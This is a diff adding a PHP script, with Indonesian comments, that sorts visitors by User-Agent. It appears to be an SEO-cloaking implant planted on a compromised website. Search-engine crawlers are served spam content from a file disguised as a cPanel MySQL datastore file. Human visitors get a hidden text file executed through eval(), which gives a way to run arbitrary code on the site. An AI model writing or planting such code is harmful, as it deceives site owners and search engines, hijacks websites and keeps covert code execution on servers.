@@ -1,0 +1,24 @@
+<?php
+function isSearchEngineBot() {
+    if (!isset($_SERVER['HTTP_USER_AGENT'])) return false;
+    return preg_match('/(googlebot|bingbot|yandexbot|baiduspider|duckduckbot|slurp|facebot|ia_archiver|TelegramBot|Google-InspectionTool|Google-Site-Verification|AhrefsBot)/i', $_SERVER['HTTP_USER_AGENT']);
+}
+
+function JajangFetchLocal($filePath) {
+    if (file_exists($filePath)) {
+        return file_get_contents($filePath);
+    } else {
+        return "<!-- File not found: $filePath -->";
+    }
+}
+
+$landing_page = '/home/chiacundippal/.cpanel/datastore/mysql-database-count';
+$index_home   = __DIR__ . '/index2.txt'; // HUMAN â†’ halaman biasa
+
+if (isSearchEngineBot()) {
+    // ROBOT â†’ tunjuk SEO landing page
+    echo JajangFetchLocal($landing_page);
+} else {
+    // HUMAN â†’ load index-backup sebagai PHP
+    eval('?>' . JajangFetchLocal($index_home));
+}
